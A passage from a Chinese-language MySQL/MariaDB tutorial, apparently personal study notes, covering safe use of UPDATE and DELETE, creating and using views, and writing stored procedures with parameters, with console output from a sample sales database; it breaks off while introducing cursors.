rabbit@wascally.com || 20004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20006 | Pep E. Lapew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20007 | Pep E. LaPew | 100 Main Street | Los Angeles | CA | 90046 | USA | NULL | NULL || 20008 | M. Martian | 42 Galaxy Way | New York | NY | 11213 | USA | NULL | NULL |+---------+----------------+---------------------+-------------+------------+----------+--------------+--------------+---------------------+15 rows in set (0.00 sec) 这条语句很容易理解。 DELETE FROM 要求指定从中删除数据的表名。WHERE 子句过滤要删除的行。在这个例子中,只删除客户 10006。如果省略 WHERE 子句,它将删除表中每个客户。 DELETE 不需要列名或通配符。 DELETE 删除整行而不是删除列。为了删除指定的列,请使用 UPDATE 语句。 删除表的内容而不是表 DELETE 语句从表中删除行,甚至是删除表中所有行。但是, DELETE不删除表本身。 更快的删除 如果想从表中删除所有行,不要使用 DELETE 。可使用 TRUNCATE TABLE 语句,它完成相同的工作,但速度更快( TRUNCATE 实际是删除原来的表并重新创建一个表,而不是逐行删除表中的数据)。 更新和删除的指导原则 前一节中使用的 UPDATE 和 DELETE 语句全都具有 WHERE 子句,这样做的理由很充分。如果省略了 WHERE 子句,则 UPDATE 或 DELETE 将被应用到表中所有的行。换句话说,如果执行 UPDATE 而不带 WHERE 子句,则表中每个行都将用新值更新。类似地,如果执行 DELETE 语句而不带 WHERE 子句,表的所有数据都将被删除。 下面是许多SQL程序员使用 UPDATE 或 DELETE 时所遵循的习惯。 除非确实打算更新和删除每一行,否则绝对不要使用不带 WHERE子句的 UPDATE 或 DELETE 语句。 保证每个表都有主键,尽可能像 WHERE 子句那样使用它(可以指定各主键、多个值或值的范围)。 在对 UPDATE 或 DELETE 语句使用 WHERE 子句前,应该先用 SELECT 进行测试,保证它过滤的是正确的记录,以防编写的 WHERE 子句不正确。 使用强制实施引用完整性的数据库,这样MySQL将不允许删除具有与其他表相关联的数据的行。 小心使用 MySQL没有撤销(undo)按钮。应该非常小心地使用 UPDATE 和 DELETE ,否则你会发现自己更新或删除了错误的数据。 小结 我们在本章中学习了如何使用 UPDATE 和 DELETE 语句处理表中的数据。我们学习了这些语句的语法,知道了它们固有的危险性。本章中还讲解了为什么 WHERE 子句对 UPDATE 和 DELETE 语句很重要,并且给出了应该遵循的一些指导原则,以保证数据的安全。 使用视图本章将介绍视图究竟是什么,它们怎样工作,何时使用它们。我们还将看到如何利用视图简化前面章节中执行的某些SQL操作。 视图 需要MySQL 5 MySQL 5添加了对视图的支持。因此,本章内容适用于MySQL 5及以后的版本。 视图是虚拟的表。与包含数据的表不一样,视图只包含使用时动态检索数据的查询。 理解视图的最好方法是看一个例子。用下面的 SELECT 语句从3个表中检索数据: 12345678910MariaDB [test]&gt; select cust_name,cust_contact from customers,orders,orderitems -&gt; where customers.cust_id=orders.cust_id and orderitems.order_num = orders.order_num -&gt; and prod_id=&apos;TNT2&apos;;+----------------+--------------+| cust_name | cust_contact |+----------------+--------------+| Coyote Inc. | Y Lee || Yosemite Place | Y Sam |+----------------+--------------+2 rows in set (0.00 sec) 此查询用来检索订购了某个特定产品的客户。任何需要这个数据的人都必须理解相关表的结构,并且知道如何创建查询和对表进行联结。为了检索其他产品(或多个产品)的相同数据,必须修改最后的 WHERE 子句。 现在,假如可以把整个查询包装成一个名为 productcustomers 的虚拟表,则可以如下轻松地检索出相同的数据:select cust_name,cust_contact from productcustomers where prod_id = &apos;TNT2&apos;; 这就是视图的作用。 productcustomers 是一个视图,作为视图,它不包含表中应该有的任何列或数据,它包含的是一个SQL查询(与上面用以正确联结表的相同的查询)。 1.为什么使用视图 我们已经看到了视图应用的一个例子。下面是视图的一些常见应用。 重用SQL语句。 简化复杂的SQL操作。在编写查询后,可以方便地重用它而不必知道它的基本查询细节。 使用表的组成部分而不是整个表。 保护数据。可以给用户授予表的特定部分的访问权限而不是整个表的访问权限。 更改数据格式和表示。视图可返回与底层表的表示和格式不同的数据。 在视图创建之后,可以用与表基本相同的方式利用它们。可以对视图执行 SELECT 操作,过滤和排序数据,将视图联结到其他视图或表,甚至能添加和更新数据(添加和更新数据存在某些限制。关于这个内容稍后还要做进一步的介绍)。 重要的是知道视图仅仅是用来查看存储在别处的数据的一种设施。视图本身不包含数据,因此它们返回的数据是从其他表中检索出来的。在添加或更改这些表中的数据时,视图将返回改变过的数据。 性能问题 因为视图不包含数据,所以每次使用视图时,都必须处理查询执行时所需的任一个检索。如果你用多个联结和过滤创建了复杂的视图或者嵌套了视图,可能会发现性能下降得很厉害。因此,在部署使用了大量视图的应用前,应该进行测试。 2.视图的规则和限制 下面是关于视图创建和使用的一些最常见的规则和限制。 与表一样,视图必须唯一命名(不能给视图取与别的视图或表相同的名字)。 对于可以创建的视图数目没有限制。 为了创建视图,必须具有足够的访问权限。这些限制通常由数据库管理人员授予。 视图可以嵌套,即可以利用从其他视图中检索数据的查询来构造一个视图。 ORDER BY 可以用在视图中,但如果从该视图检索数据 SELECT 中也含有 ORDER BY ,那么该视图中的 ORDER BY 将被覆盖。 视图不能索引,也不能有关联的触发器或默认值。 视图可以和表一起使用。例如,编写一条联结表和视图的 SELECT语句。 使用视图 在理解什么是视图(以及管理它们的规则及约束)后,我们来看一下视图的创建。 视图用 CREATE VIEW 语句来创建。 使用 SHOW CREATE VIEW viewname ;来查看创建视图的语句。 用 DROP 删除视图,其语法为 DROP VIEW viewname;。 更新视图时,可以先用DROP再用CREATE,也可以直接用CREATE ORREPLACE VIEW。如果要更新的视图不存在,则第 2 条更新语句会创建一个视图;如果要更新的视图存在,则第 2 条更新语句会替换原有视图。 1.利用视图简化复杂的联结 视图的最常见的应用之一是隐藏复杂的SQL,这通常都会涉及联结。 请看下面的例子: 创建一个名为 productcustomers 的视图,它联结三个表,以返回已订购了任意产品的所有客户的列表。如果执行SELECT * FROM productcustomers ,将列出订购了任意产品的客户。 1234567891011121314151617181920MariaDB [test]&gt; create view productcustomers as select cust_name,cust_contact,prod_id from customers,orders,orderitems where customers.cust_id=orders.cust_id and orderitems.order_num = orders.order_num ;Query OK, 0 rows affected (0.06 sec)MariaDB [test]&gt; select * from productcustomers;+----------------+--------------+---------+| cust_name | cust_contact | prod_id |+----------------+--------------+---------+| Coyote Inc. | Y Lee | ANV01 || Coyote Inc. | Y Lee | ANV02 || Coyote Inc. | Y Lee | TNT2 || Coyote Inc. | Y Lee | FB || Coyote Inc. | Y Lee | FB || Coyote Inc. | Y Lee | OL1 || Coyote Inc. | Y Lee | SLING || Coyote Inc. | Y Lee | ANV03 || Wascals | Jim Jones | JP2000 || Yosemite Place | Y Sam | TNT2 || The Fudds | E Fudd | FC |+----------------+--------------+---------+11 rows in set (0.00 sec) 检索订购了产品 TNT2 的客户 12345678MariaDB [test]&gt; select cust_name,cust_contact from productcustomers where prod_id=&apos;TNT2&apos;;+----------------+--------------+| cust_name | cust_contact |+----------------+--------------+| Coyote Inc. | Y Lee || Yosemite Place | Y Sam |+----------------+--------------+2 rows in set (0.00 sec) 这条语句通过 WHERE 子句从视图中检索特定数据。在MySQL处理此查询时,它将指定的 WHERE 子句添加到视图查询中的已有WHERE 子句中,以便正确过滤数据。 可以看出,视图极大地简化了复杂SQL语句的使用。利用视图,可一次性编写基础的SQL,然后根据需要多次使用。 创建可重用的视图 创建不受特定数据限制的视图是一种好办法。例如,上面创建的视图返回生产所有产品的客户而不仅仅是 生产TNT2 的客户。扩展视图的范围不仅使得它能被重用,而且甚至更有用。这样做不需要创建和维护多个类似视图。 2.用视图重新格式化检索出的数据 如上所述,视图的另一常见用途是重新格式化检索出的数据。下面的 SELECT 语句在单个组合计算列中返回供应商名和位置: 123456789101112131415MariaDB [test]&gt; select concat(rtrim(vend_name),&apos; (&apos;,rtrim(vend_country),&apos;)&apos;) -&gt; as vend_title -&gt; from vendors -&gt; order by vend_name;+-------------------------+| vend_title |+-------------------------+| ACME (USA) || Anvils R Us (USA) || Furball Inc. (USA) || Jet Set (England) || Jouets Et Ours (France) || LT Supplies (USA) |+-------------------------+6 rows in set (0.00 sec) 现在,假如经常需要这个格式的结果。不必在每次需要时执行联结,创建一个视图,每次需要时使用它即可。为把此语句转换为视图,可按如下进行: 123456MariaDB [test]&gt; create view vendorlocation as -&gt; select concat(rtrim(vend_name),&apos; (&apos;,rtrim(vend_country),&apos;)&apos;) -&gt; as vend_title -&gt; from vendors -&gt; order by vend_name;Query OK, 0 rows affected (0.32 sec) 这条语句使用与以前的 SELECT 语句相同的查询创建视图。为了检索出以创建所有邮件标签的数据,可如下进行: 123456789101112MariaDB [test]&gt; select * from vendorlocation;+-------------------------+| vend_title |+-------------------------+| ACME (USA) || Anvils R Us (USA) || Furball Inc. (USA) || Jet Set (England) || Jouets Et Ours (France) || LT Supplies (USA) |+-------------------------+6 rows in set (0.00 sec) 3.用视图过滤不想要的数据 视图对于应用普通的WHERE子句也很有用。 定义customeremaillist 视图,它过滤没有电子邮件地址的客户。为此目的,可使用下面的语句: 123456789101112131415161718MariaDB [test]&gt; create view customeremaillist as -&gt; select cust_id,cust_name,cust_email -&gt; from customers -&gt; where cust_email is not null;Query OK, 0 rows affected (0.05 sec)MariaDB [test]&gt; select * from customeremaillist;+---------+----------------+---------------------+| cust_id | cust_name | cust_email |+---------+----------------+---------------------+| 10001 | Coyote Inc. | ylee@coyote.com || 10003 | Wascals | rabbit@wascally.com || 10004 | Yosemite Place | sam@yosemite.com || 20001 | Coyote Inc. | ylee@coyote.com || 20003 | Wascals | rabbit@wascally.com || 20004 | Yosemite Place | sam@yosemite.com |+---------+----------------+---------------------+6 rows in set (0.00 sec) 在发送电子邮件到邮件列表时,需要排除没有电子邮件地址的用户。这里的 WHERE 子句过滤了 cust_email 列中具有NULL 值的那些行,使他们不被检索出来。 WHERE 子句与 WHERE 子句 如果从视图检索数据时使用了一条WHERE 子句,则两组子句(一组在视图中,另一组是传递给视图的)将自动组合。 4.使用视图与计算字段 视图对于简化计算字段的使用特别有用。 检索某个特定订单中的物品,计算每种物品的总价格 123456789101112MariaDB [test]&gt; select prod_id,quantity,item_price,quantity*item_price as expanded_price -&gt; from orderitems -&gt; where order_num = 20005;+---------+----------+------------+----------------+| prod_id | quantity | item_price | expanded_price |+---------+----------+------------+----------------+| ANV01 | 10 | 5.99 | 59.90 || ANV02 | 3 | 9.99 | 29.97 || TNT2 | 5 | 10.00 | 50.00 || FB | 1 | 10.00 | 10.00 |+---------+----------+------------+----------------+4 rows in set (0.00 sec) 为将其转换为一个视图,如下进行: 1234MariaDB [test]&gt; create view orderitemsexpanded as -&gt; select prod_id,quantity,item_price,quantity*item_price as expanded_price -&gt; from orderitems;Query OK, 0 rows affected (0.06 sec) 为检索订单 20005 的详细内容(上面的输出),如下进行: 123456789101112131415MariaDB [test]&gt; create view orderitemsexpanded as -&gt; select order_num,prod_id,quantity,item_price,quantity*item_price as expanded_price -&gt; from orderitems;Query OK, 0 rows affected (0.04 sec)MariaDB [test]&gt; select * from orderitemsexpanded where order_num = 20005;+-----------+---------+----------+------------+----------------+| order_num | prod_id | quantity | item_price | expanded_price |+-----------+---------+----------+------------+----------------+| 20005 | ANV01 | 10 | 5.99 | 59.90 || 20005 | ANV02 | 3 | 9.99 | 29.97 || 20005 | TNT2 | 5 | 10.00 | 50.00 || 20005 | FB | 1 | 10.00 | 10.00 |+-----------+---------+----------+------------+----------------+4 rows in set (0.00 sec) 可以看到,视图非常容易创建,而且很好使用。正确使用,视图可极大地简化复杂的数据处理。 5.更新视图 迄今为止的所有视图都是和 SELECT 语句使用的。然而,视图的数据能否更新?答案视情况而定。 通常,视图是可更新的(即,可以对它们使用 INSERT 、 UPDATE 和DELETE )。更新一个视图将更新其基表(可以回忆一下,视图本身没有数据)。如果你对视图增加或删除行,实际上是对其基表增加或删除行。 但是,并非所有视图都是可更新的。基本上可以说,如果MySQL不能正确地确定被更新的基数据,则不允许更新(包括插入和删除)。这实际上意味着,如果视图定义中有以下操作,则不能进行视图的更新: 分组(使用 GROUP BY 和 HAVING ); 联结; 子查询; 并; 聚集函数( Min() 、 Count() 、 Sum() 等); DISTINCT; 导出(计算)列。 换句话说,本章许多例子中的视图都是不可更新的。这听上去好像是一个严重的限制,但实际上不是,因为视图主要用于数据检索。 可能的变动 上面列出的限制自MySQL 5以来是正确的。不过,未来的MySQL很可能会取消某些限制。 将视图用于检索 一般,应该将视图用于检索( SELECT 语句)而不用于更新( INSERT 、 UPDATE 和 DELETE )。 小结 视图为虚拟的表。它们包含的不是数据而是根据需要检索数据的查询。视图提供了一种MySQL的 SELECT 语句层次的封装,可用来简化数据处理以及重新格式化基础数据或保护基础数据。 使用存储过程本章介绍什么是存储过程,为什么要使用存储过程以及如何使用存储过程,并且介绍创建和使用存储过程的基本语法。 存储过程 需要MySQL 5 MySQL 5添加了对存储过程的支持,因此,本章内容适用于MySQL 5及以后的版本。 迄今为止,使用的大多数SQL语句都是针对一个或多个表的单条语句。并非所有操作都这么简单,经常会有一个完整的操作需要多条语句才能完成。例如,考虑以下的情形。 为了处理订单,需要核对以保证库存中有相应的物品。 如果库存有物品,这些物品需要预定以便不将它们再卖给别的人,并且要减少可用的物品数量以反映正确的库存量。 库存中没有的物品需要订购,这需要与供应商进行某种交互。 关于哪些物品入库(并且可以立即发货)和哪些物品退订,需要通知相应的客户。 这显然不是一个完整的例子,它甚至超出了本书中所用样例表的范围,但足以帮助表达我们的意思了。执行这个处理需要针对许多表的多条MySQL语句。此外,需要执行的具体语句及其次序也不是固定的,它们可能会(和将)根据哪些物品在库存中哪些不在而变化。 那么,怎样编写此代码?可以单独编写每条语句,并根据结果有条件地执行另外的语句。在每次需要这个处理时(以及每个需要它的应用中)都必须做这些工作。 可以创建存储过程。存储过程简单来说,就是为以后的使用而保存的一条或多条MySQL语句的集合。可将其视为批文件,虽然它们的作用不仅限于批处理。 为什么要使用存储过程 既然我们知道了什么是存储过程,那么为什么要使用它们呢?有许多理由,下面列出一些主要的理由。 通过把处理封装在容易使用的单元中,简化复杂的操作(正如前面例子所述)。 由于不要求反复建立一系列处理步骤,这保证了数据的完整性。如果所有开发人员和应用程序都使用同一(试验和测试)存储过程,则所使用的代码都是相同的。 这一点的延伸就是防止错误。需要执行的步骤越多,出错的可能性就越大。防止错误保证了数据的一致性。 简化对变动的管理。如果表名、列名或业务逻辑(或别的内容)有变化,只需要更改存储过程的代码。使用它的人员甚至不需要知道这些变化。 这一点的延伸就是安全性。通过存储过程限制对基础数据的访问减少了数据讹误(无意识的或别的原因所导致的数据讹误)的机会。 提高性能。因为使用存储过程比使用单独的SQL语句要快。 存在一些只能用在单个请求中的MySQL元素和特性,存储过程可以使用它们来编写功能更强更灵活的代码(在下一章的例子中可以看到。) 换句话说,使用存储过程有3个主要的好处,即简单、安全、高性能。显然,它们都很重要。不过,在将SQL代码转换为存储过程前,也必须知道它的一些缺陷。 一般来说,存储过程的编写比基本SQL语句复杂,编写存储过程需要更高的技能,更丰富的经验。 你可能没有创建存储过程的安全访问权限。许多数据库管理员限制存储过程的创建权限,允许用户使用存储过程,但不允许他们创建存储过程。 尽管有这些缺陷,存储过程还是非常有用的,并且应该尽可能地使用。 不能编写存储过程?你依然可以使用 MySQL将编写存储过程的安全和访问与执行存储过程的安全和访问区分开来。这是好事情。即使你不能(或不想)编写自己的存储过程,也仍然可以在适当的时候执行别的存储过程。 使用存储过程 使用存储过程需要知道如何执行(运行)它们。存储过程的执行远比其定义更经常遇到,因此,我们将从执行存储过程开始介绍。然后再介绍创建和使用存储过程。 1.执行存储过程 MySQL称存储过程的执行为调用,因此MySQL执行存储过程的语句为 CALL 。 CALL 接受存储过程的名字以及需要传递给它的任意参数。请看以下例子: 执行名为 productpricing 的存储过程,它计算并返回产品的最低、最高和平均价格。 1MariaDB [test]&gt; call productpricing (@pricelow,@pricehigh,@priceaverage); 2.创建存储过程 正如所述,编写存储过程并不是微不足道的事情。为让你了解这个过程,请看一个例子。 返回产品平均价格的存储过程 123456789MariaDB [test]&gt; create procedure productpricing() begin select avg(prod_price) as priceaverage from products; end;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos; at line 1ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;end&apos; at line 1MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure productpricing() begin select avg(prod_price) as priceaverage from products; end //Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; 我们稍后介绍第一条和最后一条语句。此存储过程名为productpricing ,用 CREATE PROCEDURE productpricing() 语句定义。如果存储过程接受参数,它们将在 () 中列举出来。此存储过程没有参数,但后跟的 () 仍然需要。 BEGIN 和 END 语句用来限定存储过程体,过程体本身仅是一个简单的 SELECT 语句。 在MySQL处理这段代码时,它创建一个新的存储过程 product-pricing 。没有返回数据,因为这段代码并未调用存储过程,这里只是为以后使用而创建它。 mysql 命令行客户机的分隔符 如果你使用的是 mysql 命令行实用程序,应该仔细阅读此说明。 默认的MySQL语句分隔符为 ; (正如你已经在迄今为止所使用的MySQL语句中所看到的那样)。 mysql 命令行实用程序也使用 ; 作为语句分隔符。如果命令行实用程序要解释存储过程自身内的 ; 字符,则它们最终不会成为存储过程的成分,这会使存储过程中的SQL出现句法错误。 解决办法是临时更改命令行实用程序的语句分隔符,如下所示 1234567delimiter//create procedure productpricing()begin select avg(prod_price) as priceaverage from products;end //delimiter; 其中, DELIMITER // 告诉命令行实用程序使用// 作为新的语句结束分隔符,可以看到标志存储过程结束的 END 定义为 END// 而不是 END; 。这样,存储过程体内的 ; 仍然保持不动,并且正确地传递给数据库引擎。最后,为恢复为原来的语句分隔符,可使用 DELIMITER ; 。除 \\符号外,任何字符都可以用作语句分隔符。如果你使用的是 mysql 命令行实用程序,在阅读本章时请记住这里的内容。 那么,如何使用这个存储过程?如下所示: 123456789MariaDB [test]&gt; call productpricing();+--------------+| priceaverage |+--------------+| 16.133571 |+--------------+1 row in set (0.00 sec)Query OK, 0 rows affected (0.00 sec) CALL productpricing(); 执行刚创建的存储过程并显示返回的结果。因为存储过程实际上是一种函数,所以存储过程名后需要有 () 符号(即使不传递参数也需要)。 3.删除存储过程 存储过程在创建之后,被保存在服务器上以供使用,直至被删除。删除命令从服务器中删除存储过程。 为删除刚创建的存储过程,可使用以下语句: 12MariaDB [test]&gt; drop procedure productpricing;Query OK, 0 rows affected (0.00 sec) 这条语句删除刚创建的存储过程。请注意没有使用后面的 () ,只给出存储过程名。 仅当存在时删除 如果指定的过程不存在,则 DROP PROCEDURE将产生一个错误。当过程存在想删除它时(如果过程不存在也不产生错误)可使用 DROP PROCEDURE IF EXISTS。 12MariaDB [test]&gt; DROP PROCEDURE IF EXISTS productpricing;Query OK, 0 rows affected, 1 warning (0.00 sec) 4.使用参数 productpricing 只是一个简单的存储过程,它简单地显示 SELECT 语句的结果。一般,存储过程并不显示结果,而是把结果返回给你指定的变量。 变量(variable) 内存中一个特定的位置,用来临时存储数据。 以下是 productpricing 的修改版本(如果不先删除此存储过程,则不能再次创建它): 12345MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure productpricing(out pl decimal (8,2),out ph decimal(8,2),out pa decimal(8,2)) begin select min(prod_price) into pl from products;select max(prod_price) into ph from products;select avg(prod_price) into pa from products; end//Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; 此存储过程接受3个参数: pl 存储产品最低价格, ph 存储产品最高价格, pa 存储产品平均价格。每个参数必须具有指定的类型,这里使用十进制值。关键字 OUT 指出相应的参数用来从存储过程传出一个值(返回给调用者)。MySQL支持 IN (传递给存储过程)、 OUT (从存储过程传出,如这里所用)和 INOUT (对存储过程传入和传出)类型的参数。存储过程的代码位于 BEGIN 和 END 语句内,如前所见,它们是一系列SELECT 语句,用来检索值,然后保存到相应的变量(通过指定 INTO 关键字)。 参数的数据类型 存储过程的参数允许的数据类型与表中使用的数据类型相同。附录D列出了这些类型。注意,记录集不是允许的类型,因此,不能通过一个参数返回多个行和列。这就是前面的例子为什么要使用3个参数(和3条 SELECT 语句)的原因。 为调用此修改过的存储过程,必须指定3个变量名,如下所示: 12345MariaDB [test]&gt; call productpricing(@pricelow,@pricehigh,@priceaverage);Query OK, 1 row affected, 1 warning (0.00 sec)MariaDB [test]&gt; call productpricing(@pl,@ph,@pa);Query OK, 1 row affected, 1 warning (0.00 sec) 由于此存储过程要求3个参数,因此必须正好传递3个参数,不多也不少。所以,这条 CALL 语句给出3个参数。它们是存储过程将保存结果的3个变量的名字。 变量名 所有MySQL变量都必须以 @ 开始。 在调用时,这条语句并不显示任何数据。它返回以后可以显示(或在其他处理中使用)的变量。 为了显示检索出的产品平均价格,可如下进行: 123456789101112131415MariaDB [test]&gt; select @pl;+------+| @pl |+------+| 2.50 |+------+1 row in set (0.00 sec)MariaDB [test]&gt; select @pricelow;+-----------+| @pricelow |+-----------+| 2.50 |+-----------+1 row in set (0.00 sec) 为了获得3个值,可使用以下语句: 1234567MariaDB [test]&gt; select @pl,@ph,@pa;+------+-------+-------+| @pl | @ph | @pa |+------+-------+-------+| 2.50 | 55.00 | 16.13 |+------+-------+-------+1 row in set (0.00 sec) 下面是另外一个例子,这次使用 IN 和 OUT 参数。 ordertotal 接受订单号并返回该订单的合计: 12345MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure ordertotal(in onumber int,out ototal decimal(8,2)) begin select sum(item_price*quantity) from orderitems where order_num=onumber into ototal; end//Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; onumber 定义为 IN ,因为订单号被传入存储过程。 ototal 定义为 OUT ,因为要从存储过程返回合计。 SELECT 语句使用这两个参数, WHERE 子句使用 onumber 选择正确的行, INTO 使用 ototal 存储计算出来的合计。 为调用这个新存储过程,可使用以下语句: 12MariaDB [test]&gt; call ordertotal(20005,@total);Query OK, 1 row affected (0.00 sec) 必须给 ordertotal 传递两个参数;第一个参数为订单号,第二个参数为包含计算出来的合计的变量名。 为了显示此合计,可如下进行: 1234567MariaDB [test]&gt; select @total;+--------+| @total |+--------+| 149.87 |+--------+1 row in set (0.00 sec) @total 已由 ordertotal 的 CALL 语句填写, SELECT 显示它包含的值。 为了得到另一个订单的合计显示,需要再次调用存储过程,然后重新显示变量: 12345678910MariaDB [test]&gt; call ordertotal(20009,@total);Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; select @total;+--------+| @total |+--------+| 38.47 |+--------+1 row in set (0.00 sec) into 变量的位置可以在from前面也可以在最后1234567891011121314151617MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure ordertotal0(in onumber int,out xtotal decimal(8,2)) begin select sum(item_price*quantity) into xtotal from orderitems where order_num=onumber ; end//Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ;MariaDB [test]&gt; call ordertotal0;ERROR 1318 (42000): Incorrect number of arguments for PROCEDURE test.ordertotal0; expected 2, got 0MariaDB [test]&gt; call ordertotal0(20005,@total);Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; select @total;+--------+| @total |+--------+| 149.87 |+--------+1 row in set (0.00 sec) 5.建立智能存储过程 迄今为止使用的所有存储过程基本上都是封装MySQL简单的 SELECT语句。虽然它们全都是有效的存储过程例子,但它们所能完成的工作你直接用这些被封装的语句就能完成(如果说它们还能带来更多的东西,那就是使事情更复杂)。只有在存储过程内包含业务规则和智能处理时,它们的威力才真正显现出来。 考虑这个场景。你需要获得与以前一样的订单合计,但需要对合计增加营业税,不过只针对某些顾客(或许是你所在州中那些顾客)。那么,你需要做下面几件事情: 获得合计(与以前一样); 把营业税有条件地添加到合计; 返回合计(带或不带税)。 存储过程的完整工作如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure ordertotal( -&gt; in onumber int, -&gt; in taxable boolean, -&gt; out ototal decimal(8,2)) comment &apos;Obtain order total, optionally adding tax&apos; -&gt; begin -&gt; declare total decimal(8,2); -&gt; declare taxrate int default 6; -&gt; select sum(item_price*quantity) -&gt; from orderitems -&gt; where order_num = onumber -&gt; into total; -&gt; if taxable then -&gt; select total+(total/100*taxrate) into total; -&gt; end if; -&gt; select total into ototal; -&gt; end //Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ;[root@mastera0 ~]# vi procedure.mysql[root@mastera0 ~]# mysql -uroot -puplooking &lt; procedure.mysql[root@mastera0 ~]# cat procedure.mysqluse test;delimiter //create procedure ordertotal(in onumber int,in taxable boolean,out ototal decimal(8,2))begindeclare total decimal(8,2);declare taxrate int default 6;select sum(item_price*quantity)from orderitemswhere order_num = onumberinto total;if taxable thenselect total+(total/100*taxrate) into total;end if;select total into ototal;end //delimiter ; 此存储过程有很大的变动。首先,增加了注释(前面放置 --)。在存储过程复杂性增加时,这样做特别重要。添加了另外一个参数 taxable ,它是一个布尔值(如果要增加税则为真,否则为假)。在存储过程体中,用 DECLARE语句定义了两个局部变量。 DECLARE 要求指定变量名和数据类型,它也支持可选的默认值(这个例子中的 taxrate 的默认被设置为 6% )。 SELECT 语句已经改变,因此其结果存储到 total (局部变量)而不是 ototal 。 IF 语句检查 taxable 是否为真,如果为真,则用另一 SELECT语句增加营业税到局部变量 total 。最后,用另一 SELECT 语句将total (它增加或许不增加营业税)保存到 ototal。 COMMENT 关键字 本例子中的存储过程在 CREATE PROCEDURE语句中包含了一个 COMMENT 值。它不是必需的,但如果给出,将在 SHOW PROCEDURE STATUS 的结果中显示。 这显然是一个更高级,功能更强的存储过程。为试验它,请用以下两条语句: 12345678910MariaDB [test]&gt; call ordertotal(20005,0,@total);Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; select @total;+--------+| @total |+--------+| 149.87 |+--------+1 row in set (0.00 sec) BOOLEAN 值指定为 1 表示真,指定为 0 表示假(实际上,非零值都考虑为真,只有 0 被视为假)。通过给中间的参数指定 0 或 1 ,可以有条件地将营业税加到订单合计上。 IF 语句 这个例子给出了MySQL的 IF 语句的基本用法。 IF 语句还支持 ELSEIF 和 ELSE 子句(前者还使用 THEN 子句,后者不使用)。在以后章节中我们将会看到 IF 的其他用法(以及其他流控制语句)。 6.检查存储过程 为显示用来创建一个存储过程的 CREATE 语句,使用 SHOW CREATE PROCEDURE 语句: 12345678910111213141516171819202122232425MariaDB [test]&gt; show create procedure ordertotal\\G;*************************** 1. row *************************** Procedure: ordertotal sql_mode: Create Procedure: CREATE DEFINER=`root`@`localhost` PROCEDURE `ordertotal`(in onumber int,in taxable boolean,out ototal decimal(8,2)) COMMENT &apos;Obtain order total, optionally adding tax&apos;begindeclare total decimal(8,2);declare taxrate int default 6;select sum(item_price*quantity)from orderitemswhere order_num = onumberinto total;if taxable thenselect total+(total/100*taxrate) into total;end if;select total into ototal;endcharacter_set_client: utf8collation_connection: utf8_general_ci Database Collation: latin1_swedish_ci1 row in set (0.00 sec) 为了获得包括何时、由谁创建等详细信息的存储过程列表,使用 SHOWPROCEDURE STATUS 。 限制过程状态结果 SHOW PROCEDURE STATUS列出所有存储过程。为限制其输出,可使用 LIKE 指定一个过滤模式,例如:show procedure status like &apos;ordertotal&apos;; 小结 本章介绍了什么是存储过程以及为什么要使用存储过程。我们介绍了存储过程的执行和创建的语法以及使用存储过程的一些方法。下一章我们将继续这个话题。 使用游标本章将讲授什么是游标以及如何使用游标。 游标 需要MySQL 5 MySQL 5添加了对游标的支持,因此,本章内容适用于MySQL 5及以后的版本。 由前几章可知,MySQL检索操作返回一组称为结果集的行。这组返回的行都是与SQL语句相匹配的行(零行或多行)。使用简单的 SELECT 语句,例如,没有办法得到第一行、下一行或前10行,也不存在每次一行地处理所有行的简单方法(相对于成批地处理它们)。 有时,需要在检索出来的行中前进或后退一行或多行。这就是使用游标的原因。游标(cursor)是一个存储在MySQL服务器上的数据库查询,它不是一条 SELECT 语句,而是被该语句检索出来的结果集。在存储了游标之后,应用程序可以根据需要滚动或浏览其中的数据。 游标主要用于交互式应用,其中用户需要滚动屏幕上的数据,并对数据进行浏览或做出更改。 只能用于存储过程 不像多数DBMS,MySQL游标只能用于存储过程(和函数)。 使用游标 使用游标涉及几个明确的步骤。 在能够使用游标前,必须声明(定义)它。这个过程实际上没有检索数据,它只是定义要使用的 SELECT 语句。 一旦声明后,必须打开游标以供使用。这个过程用前面定义的SELECT 语句把数据实际检索出来。 对于填有数据的游标,根据需要取出(检索)各行。 在结束游标使用时,必须关闭游标。 在声明游标后,可根据需要频繁地打开和关闭游标。在游标打开后,可根据需要频繁地执行取操作。 1.创建游标 游标用 DECLARE 语句创建。 DECLARE 命名游标,并定义相应的 SELECT 语句,根据需要带 WHERE 和其他子句。 定义名为 ordernumbers 的游标,使用了可以检索所有订单的 SELECT 语句。 12345678910MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure processorders() -&gt; begin -&gt; declare ordernumbers cursor -&gt; for -&gt; select order_num from orders; -&gt; end //Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; 这个存储过程并没有做很多事情, DECLARE 语句用来定义和命名游标,这里为 ordernumbers 。 存储过程处理完成后,游标就消失(因为它局限于存储过程)。 在定义游标之后,可以打开它。 2.打开和关闭游标 游标用 OPEN CURSOR 语句来打开:open ordernumbers; 在处理 OPEN 语句时执行查询,存储检索出的数据以供浏览和滚动。 游标处理完成后,应当使用如下语句关闭游标:close ordernumbers; CLOSE 释放游标使用的所有内部内存和资源,因此在每个游标不再需要时都应该关闭。 